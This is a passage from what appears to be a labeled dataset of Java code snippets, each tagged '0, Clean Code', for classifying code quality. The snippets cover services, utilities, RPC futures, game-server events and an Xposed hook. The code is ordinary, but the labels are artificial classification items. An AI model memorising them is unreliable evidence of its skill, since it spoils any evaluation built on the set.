  @JsonIgnore String getType();
  /** 
 * Gets types.
 * @return the types
 */
  @JsonProperty(""type"") @JsonSerialize(using=Schema31Mixin.TypeSerializer.class) Set<String> getTypes();
  /** 
 * Add extension.
 * @param name  the name
 * @param value the value
 */
  @JsonAnySetter void addExtension(  String name,  Object value);
  /** 
 * Gets example set flag.
 * @return the example set flag
 */
  @JsonIgnore boolean getExampleSetFlag();
  /** 
 * Gets example.
 * @return the example
 */
  @JsonInclude(value=JsonInclude.Include.NON_NULL) Object getExample();
  /** 
 * Gets json schema.
 * @return the json schema
 */
  @JsonIgnore Object getJsonSchemaImpl();
  /** 
 * Gets boolean schema value.
 * @return the boolean schema value
 */
  @JsonIgnore Boolean getBooleanSchemaValue();
}
",0,Clean Code
"/** 
 * Created by zhouyuan on 2019/4/26.
 */
public class LevenshteinDistanceLogic {
  public static float compareString(  String str,  String target){
    float d[][];
    int n=str.length();
    int m=target.length();
    int i;
    int j;
    char ch1;
    char ch2;
    float temp;
    if (n == 0) {
      return m;
    }
    if (m == 0) {
      return n;
    }
    d=new float[n + 1][m + 1];
    for (i=0; i <= n; i++) {
      d[i][0]=i;
    }
    for (j=0; j <= m; j++) {
      d[0][j]=j;
    }
    for (i=1; i <= n; i++) {
      ch1=str.charAt(i - 1);
      for (j=1; j <= m; j++) {
        ch2=target.charAt(j - 1);
        temp=compare(String.valueOf(ch1),String.valueOf(ch2));
        d[i][j]=min(d[i - 1][j] + 1,d[i][j - 1] + 1,d[i - 1][j - 1] + temp);
      }
    }
    return d[n][m];
  }
  private static float compare(  String input1,  String input2){
    for (    ENV e : similarList) {
      if (e.get_key().equalsIgnoreCase(String.format(""%s%s"",input1,input2)) || e.get_key().equalsIgnoreCase(String.format(""%s%s"",input2,input1))) {
        return Float.valueOf(e.get_value());
      }
    }
    if (input1.equalsIgnoreCase(input2))     return 0;
 else     return 1;
  }
  public static List<ENV> getSimilarList(){
    return similarList;
  }
  public static void setSimilarList(  List<ENV> similarList){
    LevenshteinDistanceLogic.similarList=similarList;
  }
  private static List<ENV> similarList=new ArrayList();
  public static void addSimilar(  ENV e){
    similarList.add(e);
  }
  private static float min(  float one,  float two,  float three){
    return (one=one < two ? one : two) < three ? one : three;
  }
}
",0,Clean Code
"/** 
 * 限时购商品关联管理Service Created by macro on 2018/11/16.
 */
public interface SmsFlashPromotionProductRelationService {
  /** 
 * 批量添加关联
 */
  @Transactional int create(  List<SmsFlashPromotionProductRelation> relationList);
  /** 
 * 修改关联相关信息
 */
  int update(  Long id,  SmsFlashPromotionProductRelation relation);
  /** 
 * 删除关联
 */
  int delete(  Long id);
  /** 
 * 获取关联详情
 */
  SmsFlashPromotionProductRelation getItem(  Long id);
  /** 
 * 分页查询相关商品及促销信息
 * @param flashPromotionId        限时购id
 * @param flashPromotionSessionId 限时购场次id
 */
  List<SmsFlashPromotionProduct> list(  Long flashPromotionId,  Long flashPromotionSessionId,  Integer pageSize,  Integer pageNum);
  /** 
 * 根据活动和场次id获取商品关系数量
 * @param flashPromotionId
 * @param flashPromotionSessionId
 * @return
 */
  long getCount(  Long flashPromotionId,  Long flashPromotionSessionId);
}
",0,Clean Code
"/** 
 * @author james mu
 * @date 2019/8/22 上午11:17
 */
public class GatewaySessionHandler {
  private static final String DEVICE_PROPERTY=""device"";
  private static final String DEFAULT_DEVICE_TYPE=""default"";
  public void onDeviceTelemetry(  MqttPublishMessage mqttMsg){
  }
  public void onDeviceConnect(  MqttPublishMessage msg) throws AdaptorException {
    JsonElement json=getJson(msg);
    String deviceName=checkDeviceName(getDeviceName(json));
    System.out.println(""onDeviceConnect: "" + deviceName);
  }
  public void onDeviceDisconnect(  MqttPublishMessage msg) throws AdaptorException {
    String deviceName=checkDeviceName(getDeviceName(getJson(msg)));
  }
  public void onDeviceAttributes(  MqttPublishMessage mqttMsg){
  }
  public void onDeviceAttributesRequest(  MqttPublishMessage msg){
  }
  public void onDeviceRpcResponse(  MqttPublishMessage mqttMsg){
  }
  private JsonElement getJson(  MqttPublishMessage mqttMsg) throws AdaptorException {
    return JsonMqttAdaptor.validateJsonPayload(mqttMsg.payload());
  }
  private String checkDeviceName(  String deviceName){
    if (StringUtils.isEmpty(deviceName)) {
      throw new RuntimeException(""Device name is empty!"");
    }
 else {
      return deviceName;
    }
  }
  private String getDeviceName(  JsonElement json) throws AdaptorException {
    return json.getAsJsonObject().get(DEVICE_PROPERTY).getAsString();
  }
}",0,Clean Code
"/** 
 * @author : leix.xie
 * @date : 2019/3/1 11:26
 */
public class IBytecodeProviderImpl implements IBytecodeProvider {
  @Override public byte[] getBytecode(  String externalPath,  String internalPath) throws IOException {
    int index=externalPath.indexOf(""jar!"");
    if (index >= 0) {
      final String jar;
      if (externalPath.startsWith(""jar"")) {
        jar=externalPath.substring(9,index + 3);
      }
 else {
        jar=externalPath.substring(5,index + 3);
      }
      final String file=externalPath.substring(index + 5);
      try (JarFile jarFile=new JarFile(jar)){
        ZipEntry entry=jarFile.getEntry(file);
        if (entry == null) {
          throw new IOException(""Entry not found: "" + internalPath);
        }
        return InterpreterUtil.getBytes(jarFile,entry);
      }
     }
    File file=new File(externalPath);
    if (internalPath == null) {
      return InterpreterUtil.getBytes(file);
    }
 else {
      try (ZipFile archive=new ZipFile(file)){
        ZipEntry entry=archive.getEntry(internalPath);
        if (entry == null)         throw new IOException(""Entry not found: "" + internalPath);
        return InterpreterUtil.getBytes(archive,entry);
      }
     }
  }
  private static boolean isJarFile(  URL resource){
    return ""jar"".equalsIgnoreCase(resource.getProtocol());
  }
}
",0,Clean Code
"/** 
 * 模板分组
 * @author PIG
 * @date 2023-02-21 20:01:53
 */
@Slf4j @Service @AllArgsConstructor public class GenGroupServiceImpl extends ServiceImpl<GenGroupMapper,GenGroupEntity> implements GenGroupService {
  private final GenTemplateGroupService genTemplateGroupService;
  /** 
 * 新增模板分组
 * @param genTemplateGroup
 */
  @Override public void saveGenGroup(  TemplateGroupDTO genTemplateGroup){
    GenGroupEntity groupEntity=new GenGroupEntity();
    BeanUtil.copyProperties(genTemplateGroup,groupEntity);
    baseMapper.insert(groupEntity);
    List<GenTemplateGroupEntity> goals=new LinkedList<>();
    for (    Long TemplateId : genTemplateGroup.getTemplateId()) {
      GenTemplateGroupEntity templateGroup=new GenTemplateGroupEntity();
      templateGroup.setTemplateId(TemplateId).setGroupId(groupEntity.getId());
      goals.add(templateGroup);
    }
    genTemplateGroupService.saveBatch(goals);
  }
  /** 
 * 按照ids删除
 * @param ids groupIds
 */
  @Override public void delGroupAndTemplate(  Long[] ids){
    this.removeBatchByIds(CollUtil.toList(ids));
    genTemplateGroupService.remove(Wrappers.<GenTemplateGroupEntity>lambdaQuery().in(GenTemplateGroupEntity::getGroupId,ids));
  }
  /** 
 * 按照id查询
 * @param id
 * @return
 */
  @Override public GroupVO getGroupVoById(  Long id){
    return baseMapper.getGroupVoById(id);
  }
  /** 
 * 根据id更新
 * @param groupVo
 */
  @Override public void updateGroupAndTemplateById(  GroupVO groupVo){
    GenGroupEntity groupEntity=new GenGroupEntity();
    BeanUtil.copyProperties(groupVo,groupEntity);
    this.updateById(groupEntity);
    genTemplateGroupService.remove(Wrappers.<GenTemplateGroupEntity>lambdaQuery().eq(GenTemplateGroupEntity::getGroupId,groupVo.getId()));
    List<GenTemplateGroupEntity> goals=new LinkedList<>();
    for (    Long templateId : groupVo.getTemplateId()) {
      goals.add(new GenTemplateGroupEntity().setGroupId(groupVo.getId()).setTemplateId(templateId));
    }
    genTemplateGroupService.saveBatch(goals);
  }
}
",0,Clean Code
"public class PopMenuAdapter extends BaseAdapter {
  private List<PopMenuAction> dataSource=new ArrayList<>();
  public PopMenuAdapter(){
  }
  public void setDataSource(  final List datas){
    dataSource=datas;
    ThreadUtils.postOnUiThread(new Runnable(){
      @Override public void run(){
        notifyDataSetChanged();
      }
    }
);
  }
  @Override public int getCount(){
    return dataSource.size();
  }
  @Override public Object getItem(  int position){
    return dataSource.get(position);
  }
  @Override public long getItemId(  int position){
    return position;
  }
  @Override public View getView(  final int position,  View convertView,  ViewGroup parent){
    ViewHolder holder;
    if (convertView == null) {
      convertView=LayoutInflater.from(TUIConfig.getAppContext()).inflate(R.layout.pop_menu_adapter,parent,false);
      holder=new ViewHolder();
      holder.menuIcon=convertView.findViewById(R.id.pop_menu_icon);
      int iconSize=convertView.getResources().getDimensionPixelSize(R.dimen.core_pop_menu_icon_size);
      ViewGroup.LayoutParams params=holder.menuIcon.getLayoutParams();
      params.width=iconSize;
      params.height=iconSize;
      holder.menuIcon.setLayoutParams(params);
      holder.menuLable=convertView.findViewById(R.id.pop_menu_label);
      convertView.setTag(holder);
    }
 else {
      holder=(ViewHolder)convertView.getTag();
    }
    PopMenuAction action=(PopMenuAction)getItem(position);
    holder.menuIcon.setVisibility(View.VISIBLE);
    if (action.getIcon() != null) {
      holder.menuIcon.setImageBitmap(action.getIcon());
    }
 else     if (action.getIconResId() > 0) {
      holder.menuIcon.setImageResource(action.getIconResId());
    }
 else {
      holder.menuIcon.setVisibility(View.GONE);
    }
    holder.menuLable.setText(action.getActionName());
    return convertView;
  }
static class ViewHolder {
    TextView menuLable;
    ImageView menuIcon;
  }
}
",0,Clean Code
"@JsonTypeInfo(use=JsonTypeInfo.Id.NAME,include=JsonTypeInfo.As.EXISTING_PROPERTY,property=""type"",visible=true) @JsonSubTypes({@JsonSubTypes.Type(value=ConcreteObjectA.class,name=""Type A"")}) public abstract class AbstractObject {
  private final ConcreteType type;
  private final String name;
  protected AbstractObject(  ConcreteType type,  String name){
    this.type=type;
    this.name=name;
  }
  public ConcreteType getType(){
    return type;
  }
  public String getName(){
    return name;
  }
}
/** 
 * The type Abstract object.
 */
@JsonTypeInfo(use=JsonTypeInfo.Id.NAME,include=JsonTypeInfo.As.EXISTING_PROPERTY,property=""type"",visible=true) @JsonSubTypes({@JsonSubTypes.Type(value=ConcreteObjectA.class,name=""Type A"")}) public abstract class AbstractObject {
  /** 
 * The Type.
 */
  private final ConcreteType type;
  /** 
 * The Name.
 */
  private final String name;
  /** 
 * Instantiates a new Abstract object.
 * @param type the type 
 * @param name the name
 */
  protected AbstractObject(  ConcreteType type,  String name){
    this.type=type;
    this.name=name;
  }
  /** 
 * Gets type.
 * @return the type
 */
  public ConcreteType getType(){
    return type;
  }
  /** 
 * Gets name.
 * @return the name
 */
  public String getName(){
    return name;
  }
}
",0,Clean Code
"final class MapIterator implements Iterator<Map.Entry<K,V>>, Map.Entry<K,V> {
  int mEnd;
  int mIndex;
  boolean mEntryValid=false;
  MapIterator(){
    mEnd=colGetSize() - 1;
    mIndex=-1;
  }
  @Override public boolean hasNext(){
    return mIndex < mEnd;
  }
  @Override public Map.Entry<K,V> next(){
    if (!hasNext())     throw new NoSuchElementException();
    mIndex++;
    mEntryValid=true;
    return this;
  }
  @Override public void remove(){
    if (!mEntryValid) {
      throw new IllegalStateException();
    }
    colRemoveAt(mIndex);
    mIndex--;
    mEnd--;
    mEntryValid=false;
  }
  @Override public K getKey(){
    if (!mEntryValid) {
      throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");
    }
    return (K)colGetEntry(mIndex,0);
  }
  @Override public V getValue(){
    if (!mEntryValid) {
      throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");
    }
    return (V)colGetEntry(mIndex,1);
  }
  @Override public V setValue(  V object){
    if (!mEntryValid) {
      throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");
    }
    return colSetValue(mIndex,object);
  }
  @Override public boolean equals(  Object o){
    if (!mEntryValid) {
      throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");
    }
    if (!(o instanceof Map.Entry)) {
      return false;
    }
    Map.Entry<?,?> e=(Map.Entry<?,?>)o;
    return ContainerHelpers.equal(e.getKey(),colGetEntry(mIndex,0)) && ContainerHelpers.equal(e.getValue(),colGetEntry(mIndex,1));
  }
  @Override public int hashCode(){
    if (!mEntryValid) {
      throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");
    }
    final Object key=colGetEntry(mIndex,0);
    final Object value=colGetEntry(mIndex,1);
    return (key == null ? 0 : key.hashCode()) ^ (value == null ? 0 : value.hashCode());
  }
  @Override public String toString(){
    return getKey() + ""="" + getValue();
  }
}
",0,Clean Code
"/** 
 * Created by heavyrainlee on 20/12/2017.
 */
@ContentTag(type=ContentType_CREATE_GROUP,flag=PersistFlag.Persist) public class CreateGroupNotificationContent extends GroupNotificationMessageContent {
  public String creator;
  public String groupName;
  public CreateGroupNotificationContent(){
  }
  @Override public String formatNotification(  Message message){
    StringBuilder sb=new StringBuilder();
    if (fromSelf) {
      sb.append(""您创建了群组 "");
    }
 else {
      sb.append(ChatManager.Instance().getUserDisplayName(creator));
      sb.append(""创建了群组 "");
    }
    sb.append(groupName);
    return sb.toString();
  }
  @Override public MessagePayload encode(){
    MessagePayload payload=super.encode();
    try {
      JSONObject objWrite=new JSONObject();
      objWrite.put(""g"",groupId);
      objWrite.put(""o"",creator);
      objWrite.put(""n"",groupName);
      payload.binaryContent=objWrite.toString().getBytes();
    }
 catch (    JSONException e) {
      e.printStackTrace();
    }
    return payload;
  }
  @Override public void decode(  MessagePayload payload){
    super.decode(payload);
    try {
      if (payload.binaryContent != null) {
        JSONObject jsonObject=new JSONObject(new String(payload.binaryContent));
        groupId=jsonObject.optString(""g"");
        creator=jsonObject.optString(""o"");
        groupName=jsonObject.optString(""n"");
      }
    }
 catch (    JSONException e) {
      e.printStackTrace();
    }
  }
  @Override public int describeContents(){
    return 0;
  }
  @Override public void writeToParcel(  Parcel dest,  int flags){
    super.writeToParcel(dest,flags);
    dest.writeString(this.creator);
    dest.writeString(this.groupName);
  }
  protected CreateGroupNotificationContent(  Parcel in){
    super(in);
    this.creator=in.readString();
    this.groupName=in.readString();
  }
  public static final Creator<CreateGroupNotificationContent> CREATOR=new Creator<CreateGroupNotificationContent>(){
    @Override public CreateGroupNotificationContent createFromParcel(    Parcel source){
      return new CreateGroupNotificationContent(source);
    }
    @Override public CreateGroupNotificationContent[] newArray(    int size){
      return new CreateGroupNotificationContent[size];
    }
  }
;
}
",0,Clean Code
"@EnvTest public class ChunkHeightmapIntegrationTest {
  @Test public void testChunkHeightmap(  Env env){
    var instance=env.createFlatInstance();
    instance.loadChunk(0,0).join();
    var chunk=instance.getChunk(0,0);
    var heightmap=chunk.motionBlockingHeightmap().getHeight(0,0);
    assertEquals(heightmap,39);
  }
  @Test public void heightMapPlaceTest(  Env env){
    var instance=env.createFlatInstance();
    instance.loadChunk(0,0).join();
    var chunk=instance.getChunk(0,0);
{
      instance.setBlock(0,40,0,Block.STONE);
      var heightmap=chunk.motionBlockingHeightmap().getHeight(0,0);
      assertEquals(heightmap,40);
    }
{
      instance.setBlock(0,45,0,Block.STONE);
      var heightmap=chunk.motionBlockingHeightmap().getHeight(0,0);
      assertEquals(heightmap,45);
    }
  }
  @Test public void heightMapRemoveTest(  Env env){
    var instance=env.createFlatInstance();
    instance.loadChunk(0,0).join();
    var chunk=instance.getChunk(0,0);
{
      instance.setBlock(0,45,0,Block.STONE);
      var heightmap=chunk.motionBlockingHeightmap().getHeight(0,0);
      assertEquals(heightmap,45);
    }
{
      instance.setBlock(0,45,0,Block.AIR);
      var heightmap=chunk.motionBlockingHeightmap().getHeight(0,0);
      assertEquals(heightmap,39);
    }
  }
}
",0,Clean Code
"@FunctionEntry public class DisablePokeEffect extends CommonDelayableHook {
  public static final DisablePokeEffect INSTANCE=new DisablePokeEffect();
  public DisablePokeEffect(){
    super(""rq_disable_poke_effect"");
  }
  @Override public boolean initOnce(){
    try {
      for (      Method m : Initiator._GivingHeartItemBuilder().getDeclaredMethods()) {
        Class<?>[] argt=m.getParameterTypes();
        if (m.getName().equals(""a"") && argt.length == 3 && !Modifier.isStatic(m.getModifiers())) {
          XposedBridge.hookMethod(m,new XC_MethodHook(){
            @Override protected void beforeHookedMethod(            MethodHookParam param) throws Throwable {
              if (LicenseStatus.sDisableCommonHooks) {
                return;
              }
              if (!isEnabled()) {
                return;
              }
              if (param.getResult().getClass().isPrimitive()) {
                param.setResult(false);
              }
            }
          }
);
        }
      }
      return true;
    }
 catch (    Throwable e) {
      return false;
    }
  }
}
",0,Clean Code
"/** 
 * @author james mu
 * @date 2020/9/7 19:12
 */
@Component public class JwtTokenUtil implements Serializable {
  private static final long serialVersionUID=-2550185165626007488L;
  public static final long JWT_TOKEN_VALIDITY=5 * 60 * 60;
  @Value(""${jwt.secret}"") private String secret;
  public String getUsernameFromToken(  String token){
    return getClaimFromToken(token,Claims::getSubject);
  }
  public Date getIssuedAtDateFromToken(  String token){
    return getClaimFromToken(token,Claims::getIssuedAt);
  }
  public Date getExpirationDateFromToken(  String token){
    return getClaimFromToken(token,Claims::getExpiration);
  }
  public <T>T getClaimFromToken(  String token,  Function<Claims,T> claimsResolver){
    final Claims claims=getAllClaimsFromToken(token);
    return claimsResolver.apply(claims);
  }
  private Claims getAllClaimsFromToken(  String token){
    return Jwts.parser().setSigningKey(secret).parseClaimsJws(token).getBody();
  }
  private Boolean isTokenExpired(  String token){
    final Date expiration=getExpirationDateFromToken(token);
    return expiration.before(new Date());
  }
  private Boolean ignoreTokenExpiration(  String token){
    return false;
  }
  public String generateToken(  UserDetails userDetails){
    Map<String,Object> claims=new HashMap<>();
    return doGenerateToken(claims,userDetails.getUsername());
  }
  private String doGenerateToken(  Map<String,Object> claims,  String subject){
    return Jwts.builder().setClaims(claims).setSubject(subject).setIssuedAt(new Date(System.currentTimeMillis())).setExpiration(new Date(System.currentTimeMillis() + JWT_TOKEN_VALIDITY * 1000)).signWith(SignatureAlgorithm.HS512,secret).compact();
  }
  public Boolean canTokenBeRefreshed(  String token){
    return (!isTokenExpired(token) || ignoreTokenExpiration(token));
  }
  public Boolean validateToken(  String token,  UserDetails userDetails){
    final String username=getUsernameFromToken(token);
    return (username.equals(userDetails.getUsername()) && !isTokenExpired(token));
  }
}",0,Clean Code
"/** 
 * @author AllDataDC
 * @date 2023/3/26 11:14
 * @Description :
 */
public class XxlRpcInvokeFuture implements Future {
  private XxlRpcFutureResponse futureResponse;
  public XxlRpcInvokeFuture(  XxlRpcFutureResponse futureResponse){
    this.futureResponse=futureResponse;
  }
  public void stop(){
    futureResponse.removeInvokerFuture();
  }
  @Override public boolean cancel(  boolean mayInterruptIfRunning){
    return futureResponse.cancel(mayInterruptIfRunning);
  }
  @Override public boolean isCancelled(){
    return futureResponse.isCancelled();
  }
  @Override public boolean isDone(){
    return futureResponse.isDone();
  }
  @Override public Object get() throws ExecutionException, InterruptedException {
    try {
      return get(-1,TimeUnit.MILLISECONDS);
    }
 catch (    TimeoutException e) {
      throw new XxlRpcException(e);
    }
  }
  @Override public Object get(  long timeout,  TimeUnit unit) throws InterruptedException, ExecutionException, TimeoutException {
    try {
      XxlRpcResponse xxlRpcResponse=futureResponse.get(timeout,unit);
      if (xxlRpcResponse.getErrorMsg() != null) {
        throw new XxlRpcException(xxlRpcResponse.getErrorMsg());
      }
      return xxlRpcResponse.getResult();
    }
  finally {
      stop();
    }
  }
  private static ThreadLocal<XxlRpcInvokeFuture> threadInvokerFuture=new ThreadLocal<XxlRpcInvokeFuture>();
  /** 
 * get future
 * @param type
 * @param < T >
 * @return
 */
  public static <T>Future<T> getFuture(  Class<T> type){
    Future<T> future=(Future<T>)threadInvokerFuture.get();
    threadInvokerFuture.remove();
    return future;
  }
  /** 
 * set future
 * @param future
 */
  public static void setFuture(  XxlRpcInvokeFuture future){
    threadInvokerFuture.set(future);
  }
  /** 
 * remove future
 */
  public static void removeFuture(){
    threadInvokerFuture.remove();
  }
}",0,Clean Code
"/** 
 * BPM 消息 Service 实现类
 * @author 芋道源码
 */
@Service @Validated @Slf4j public class BpmMessageServiceImpl implements BpmMessageService {
  @Resource private SmsSendApi smsSendApi;
  @Resource private WebProperties webProperties;
  @Override public void sendMessageWhenProcessInstanceApprove(  BpmMessageSendWhenProcessInstanceApproveReqDTO reqDTO){
    Map<String,Object> templateParams=new HashMap<>();
    templateParams.put(""processInstanceName"",reqDTO.getProcessInstanceName());
    templateParams.put(""detailUrl"",getProcessInstanceDetailUrl(reqDTO.getProcessInstanceId()));
    smsSendApi.sendSingleSmsToAdmin(BpmMessageConvert.INSTANCE.convert(reqDTO.getStartUserId(),BpmMessageEnum.PROCESS_INSTANCE_APPROVE.getSmsTemplateCode(),templateParams)).checkError();
  }
  @Override public void sendMessageWhenProcessInstanceReject(  BpmMessageSendWhenProcessInstanceRejectReqDTO reqDTO){
    Map<String,Object> templateParams=new HashMap<>();
    templateParams.put(""processInstanceName"",reqDTO.getProcessInstanceName());
    templateParams.put(""reason"",reqDTO.getReason());
    templateParams.put(""detailUrl"",getProcessInstanceDetailUrl(reqDTO.getProcessInstanceId()));
    smsSendApi.sendSingleSmsToAdmin(BpmMessageConvert.INSTANCE.convert(reqDTO.getStartUserId(),BpmMessageEnum.PROCESS_INSTANCE_REJECT.getSmsTemplateCode(),templateParams)).checkError();
  }
  @Override public void sendMessageWhenTaskAssigned(  BpmMessageSendWhenTaskCreatedReqDTO reqDTO){
    Map<String,Object> templateParams=new HashMap<>();
    templateParams.put(""processInstanceName"",reqDTO.getProcessInstanceName());
    templateParams.put(""taskName"",reqDTO.getTaskName());
    templateParams.put(""startUserNickname"",reqDTO.getStartUserNickname());
    templateParams.put(""detailUrl"",getProcessInstanceDetailUrl(reqDTO.getProcessInstanceId()));
    smsSendApi.sendSingleSmsToAdmin(BpmMessageConvert.INSTANCE.convert(reqDTO.getAssigneeUserId(),BpmMessageEnum.TASK_ASSIGNED.getSmsTemplateCode(),templateParams)).checkError();
  }
  @Override public void sendMessageWhenTaskTimeout(  BpmMessageSendWhenTaskTimeoutReqDTO reqDTO){
    Map<String,Object> templateParams=new HashMap<>();
    templateParams.put(""processInstanceName"",reqDTO.getProcessInstanceName());
    templateParams.put(""taskName"",reqDTO.getTaskName());
    templateParams.put(""detailUrl"",getProcessInstanceDetailUrl(reqDTO.getProcessInstanceId()));
    smsSendApi.sendSingleSmsToAdmin(BpmMessageConvert.INSTANCE.convert(reqDTO.getAssigneeUserId(),BpmMessageEnum.TASK_TIMEOUT.getSmsTemplateCode(),templateParams)).checkError();
  }
  private String getProcessInstanceDetailUrl(  String taskId){
    return webProperties.getAdminUi().getUrl() + ""/bpm/process-instance/detail?id="" + taskId;
  }
}
",0,Clean Code
"/** 
 * @author xuxueli 2018-10-22 18:31:42
 */
public class XxlRpcInvokeFuture implements Future {
  private XxlRpcFutureResponse futureResponse;
  public XxlRpcInvokeFuture(  XxlRpcFutureResponse futureResponse){
    this.futureResponse=futureResponse;
  }
  public void stop(){
    futureResponse.removeInvokerFuture();
  }
  @Override public boolean cancel(  boolean mayInterruptIfRunning){
    return futureResponse.cancel(mayInterruptIfRunning);
  }
  @Override public boolean isCancelled(){
    return futureResponse.isCancelled();
  }
  @Override public boolean isDone(){
    return futureResponse.isDone();
  }
  @Override public Object get() throws ExecutionException, InterruptedException {
    try {
      return get(-1,TimeUnit.MILLISECONDS);
    }
 catch (    TimeoutException e) {
      throw new XxlRpcException(e);
    }
  }
  @Override public Object get(  long timeout,  TimeUnit unit) throws InterruptedException, ExecutionException, TimeoutException {
    try {
      XxlRpcResponse xxlRpcResponse=futureResponse.get(timeout,unit);
      if (xxlRpcResponse.getErrorMsg() != null) {
        throw new XxlRpcException(xxlRpcResponse.getErrorMsg());
      }
      return xxlRpcResponse.getResult();
    }
  finally {
      stop();
    }
  }
  private static ThreadLocal<XxlRpcInvokeFuture> threadInvokerFuture=new ThreadLocal<XxlRpcInvokeFuture>();
  /** 
 * get future
 * @param type
 * @param < T >
 * @return
 */
  public static <T>Future<T> getFuture(  Class<T> type){
    Future<T> future=(Future<T>)threadInvokerFuture.get();
    threadInvokerFuture.remove();
    return future;
  }
  /** 
 * set future
 * @param future
 */
  public static void setFuture(  XxlRpcInvokeFuture future){
    threadInvokerFuture.set(future);
  }
  /** 
 * remove future
 */
  public static void removeFuture(){
    threadInvokerFuture.remove();
  }
}
",0,Clean Code
"public interface SetGroupManagerRequestOrBuilder extends com.google.protobuf.MessageOrBuilder {
  /** 
 * <code>required string group_id = 1;</code>
 */
  boolean hasGroupId();
  /** 
 * <code>required string group_id = 1;</code>
 */
  java.lang.String getGroupId();
  /** 
 * <code>required string group_id = 1;</code>
 */
  com.google.protobuf.ByteString getGroupIdBytes();
  /** 
 * <code>required int32 type = 2;</code>
 */
  boolean hasType();
  /** 
 * <code>required int32 type = 2;</code>
 */
  int getType();
  /** 
 * <code>repeated string user_id = 3;</code>
 */
  java.util.List<java.lang.String> getUserIdList();
  /** 
 * <code>repeated string user_id = 3;</code>
 */
  int getUserIdCount();
  /** 
 * <code>repeated string user_id = 3;</code>
 */
  java.lang.String getUserId(  int index);
  /** 
 * <code>repeated string user_id = 3;</code>
 */
  com.google.protobuf.ByteString getUserIdBytes(  int index);
  /** 
 * <code>repeated int32 to_line = 4;</code>
 */
  java.util.List<java.lang.Integer> getToLineList();
  /** 
 * <code>repeated int32 to_line = 4;</code>
 */
  int getToLineCount();
  /** 
 * <code>repeated int32 to_line = 4;</code>
 */
  int getToLine(  int index);
  /** 
 * <code>optional .MessageContent notify_content = 5;</code>
 */
  boolean hasNotifyContent();
  /** 
 * <code>optional .MessageContent notify_content = 5;</code>
 */
  cn.wildfirechat.proto.WFCMessage.MessageContent getNotifyContent();
  /** 
 * <code>optional .MessageContent notify_content = 5;</code>
 */
  cn.wildfirechat.proto.WFCMessage.MessageContentOrBuilder getNotifyContentOrBuilder();
}
",0,Clean Code
"/** 
 * A  {@link BeanRegistrationWriterSupplier} that handles immutable{@link ConfigurationProperties}-annotated types.
 * @author Stephane Nicoll
 */
@Order(0) class ConfigurationPropertiesBeanRegistrationWriterSupplier implements BeanRegistrationWriterSupplier {
  private static final BindConstructorProvider bindConstructorProvider=new ConfigurationPropertiesBindConstructorProvider();
  @Override public BeanRegistrationWriter get(  String beanName,  BeanDefinition beanDefinition){
    if (!isImmutableConfigurationPropertiesBeanDefinition(beanDefinition)) {
      return null;
    }
    BeanInstanceDescriptor descriptor=BeanInstanceDescriptor.of(beanDefinition.getResolvableType()).withInstanceCreator(getBindConstructor(beanName,beanDefinition)).build();
    return new DefaultBeanRegistrationWriter(beanName,beanDefinition,descriptor){
      @Override protected Predicate<String> getAttributeFilter(){
        return (candidate) -> candidate.equals(BindMethod.class.getName());
      }
      @Override protected boolean shouldDeclareCreator(      BeanInstanceDescriptor descriptor){
        return false;
      }
      @Override protected void writeInstanceSupplier(      Builder code){
        code.add(""() -> $T.bind(beanFactory, $S, $T.class)"",ConstructorBindingValueSupplier.class,beanName,descriptor.getUserBeanClass());
      }
    }
;
  }
  private Constructor<?> getBindConstructor(  String beanName,  BeanDefinition beanDefinition){
    ConfigurationPropertiesBean bean=ConfigurationPropertiesBean.forValueObject(beanDefinition.getResolvableType().toClass(),beanName);
    return bindConstructorProvider.getBindConstructor(bean.asBindTarget(),false);
  }
  private boolean isImmutableConfigurationPropertiesBeanDefinition(  BeanDefinition beanDefinition){
    return beanDefinition.hasAttribute(BindMethod.class.getName()) && BindMethod.VALUE_OBJECT.equals(beanDefinition.getAttribute(BindMethod.class.getName()));
  }
}
",0,Clean Code
"/** 
 * A snapshot of the values for an entry. 
 */
public final class Value {
  private final String key;
  private final long sequenceNumber;
  private final long[] lengths;
  private final File[] files;
  private Value(  String key,  long sequenceNumber,  File[] files,  long[] lengths){
    this.key=key;
    this.sequenceNumber=sequenceNumber;
    this.files=files;
    this.lengths=lengths;
  }
  /** 
 * Returns an editor for this snapshot's entry, or null if either the entry has changed since this snapshot was created or if another edit is in progress.
 */
  public Editor edit() throws IOException {
    return DiskLruCache.this.edit(key,sequenceNumber);
  }
  public File getFile(  int index){
    return files[index];
  }
  /** 
 * Returns the string value for  {@code index}. 
 */
  public String getString(  int index) throws IOException {
    InputStream is=new FileInputStream(files[index]);
    return inputStreamToString(is);
  }
  /** 
 * Returns the byte length of the value for  {@code index}. 
 */
  public long getLength(  int index){
    return lengths[index];
  }
}
",0,Clean Code
"/** 
 * Called when a player change his held slot (by pressing 1-9 keys).
 */
public class PlayerChangeHeldSlotEvent implements PlayerInstanceEvent, CancellableEvent {
  private final Player player;
  private final byte oldSlot;
  private byte newSlot;
  private boolean cancelled;
  public PlayerChangeHeldSlotEvent(  @NotNull Player player,  byte oldSlot,  byte newSlot){
    this.player=player;
    this.oldSlot=oldSlot;
    this.newSlot=newSlot;
  }
  /** 
 * Gets the slot which the player will hold.
 * @deprecated Use {@link #getNewSlot()} instead.
 * @return the future slot
 */
  @Deprecated(forRemoval=true) public byte getSlot(){
    return newSlot;
  }
  /** 
 * Gets the slot number that the player is currently holding
 * @return The slot index that the player currently is holding
 */
  public int getOldSlot(){
    return oldSlot;
  }
  /** 
 * Gets the slot which the player will hold.
 * @return the future slot
 */
  public byte getNewSlot(){
    return newSlot;
  }
  /** 
 * Changes the final held slot of the player.
 * @param slot the new held slot
 * @deprecated Use {@link #setNewSlot(byte)} instead
 * @throws IllegalArgumentException if <code>slot</code> is not between 0 and 8
 */
  @Deprecated(forRemoval=true) public void setSlot(  byte slot){
    Check.argCondition(!MathUtils.isBetween(slot,0,8),""The held slot needs to be between 0 and 8"");
    this.newSlot=slot;
  }
  /** 
 * Changes the final held slot of the player.
 * @param slot the new held slot
 * @throws IllegalArgumentException if <code>slot</code> is not between 0 and 8
 */
  public void setNewSlot(  byte slot){
    Check.argCondition(!MathUtils.isBetween(slot,0,8),""The held slot needs to be between 0 and 8"");
    this.newSlot=slot;
  }
  /** 
 * Gets the ItemStack in the player's currently held slot
 * @return The ItemStack in the player's currently held slot
 */
  public ItemStack getItemInOldSlot(){
